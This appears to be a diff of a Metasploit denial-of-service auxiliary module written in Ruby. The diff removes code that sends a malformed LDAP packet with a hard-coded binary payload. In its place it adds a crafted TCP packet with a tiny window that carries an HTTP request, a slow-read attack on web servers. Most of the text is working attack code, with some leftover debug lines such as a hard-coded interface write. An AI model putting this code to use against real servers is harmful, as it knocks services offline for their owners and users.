@@ -11,7 +11,6 @@ class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Capture
 	#include Msf::Exploit::Remote::Tcp
-	include Msf::Exploit::Remote::HttpClient
 	include Msf::Auxiliary::Dos
 
 	def initialize
@@ -32,6 +31,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options([
 			#OptInt.new('RPORT', [true, 'The destination port', 389]),
+			OptString.new('URI', [true, 'Resource to request', '/']),
 		], self.class)
 	end
 
@@ -39,22 +39,25 @@ class Metasploit3 < Msf::Auxiliary
 
 		open_pcap
 
-		print_status("Sending malformed LDAP packet to #{rhost}")
-
-		m = Rex::Text.rand_text_alpha_lower(3)
+		print_status("Sending request with small TCP window to #{rhost}")
 
 		p = PacketFu::TCPPacket.new
-		p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
-		p.ip_daddr = rhost
-		p.tcp_ack = rand(0x100000000)
-		p.tcp_flags.syn = 1
-		p.tcp_flags.ack = 1
+		#p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
+		#p.tcp_ack = rand(0x100000000)
+		#p.tcp_flags.syn = 1
+		#p.tcp_flags.ack = 1
+		p.ip_daddr = datastore['RHOST']
 		p.tcp_dport = datastore['RPORT'].to_i
-		p.tcp_window = 3072
-		p.payload = "0O\002\002;\242cI\004\rdc=#{m},dc=#{m}\n\001\002\n\001\000\002\001\000\002\001\000\001\001\000\241'\243\016"
+		p.tcp_win = 10
+		p.payload = "GET #{datastore['URI']} HTTP/1.1\r\n"
+		p.payload << "Host: #{datastore['RHOST']}\r\n"
+		p.payload << "User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) Presto/2.9.168 Version/11.50\r\n"
+		p.payload << "Referer: http://code.google.com/p/slowhttptest/\r\n"
 		p.recalc
 
-		capture_sendto(p, rhost)
+		res = p.to_w("eth0")
+		puts res.inspect
+		capture_sendto(p, datastore['RHOST'])
 		close_pcap
 
 	end
